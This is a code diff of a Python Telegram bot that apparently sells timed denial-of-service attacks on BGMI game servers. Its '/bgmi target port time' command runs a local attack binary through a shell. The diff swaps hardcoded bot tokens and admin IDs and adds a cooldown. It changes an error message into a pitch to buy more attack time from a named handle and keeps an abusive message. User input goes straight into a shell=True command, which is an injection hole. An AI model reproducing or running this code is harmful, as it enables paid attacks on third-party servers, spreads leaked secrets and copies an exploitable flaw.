@@ -4,10 +4,10 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7647515503:AAG8MtATd-RDRTngBRFuYgn--ZX1cB_4qbc')
+bot = telebot.TeleBot('7711342282:AAE37EclaH0Zfp8q9LdpN3lPYZZBjoVtSUg')
 
 # Admin user IDs
-admin_id = {"6437994839"}
+admin_id = {"1174779637"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -270,7 +270,7 @@ def start_bgmi_reply(message, target, port, time):
     # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =20
 
 bgmi_running = False
 
@@ -293,7 +293,7 @@ def handle_bgmi(message):
             time = int(command[3])  # Convert time to integer
 
             if time > 241:
-                response = "Error: THIS IS BEST WHAT I CAN OFFER YOU"
+                response = "Error: Buy From @HMSahil9 For More Time"
             else:
                 bgmi_running = True  # Set the bgmi state to running
                 try:
@@ -302,7 +302,7 @@ def handle_bgmi(message):
                     start_bgmi_reply(message, target, port, time)
 
                     # Simulate bgmi process
-                    full_command = f"./bgmi {target} {port} {time}"
+                    full_command = f"./RAJ {target} {port} {time}"
                     subprocess.run(full_command, shell=True)
 
                     response = "bgmi Ritik ne chot ke fek diya @Riyahacksyt isski mummy ko."
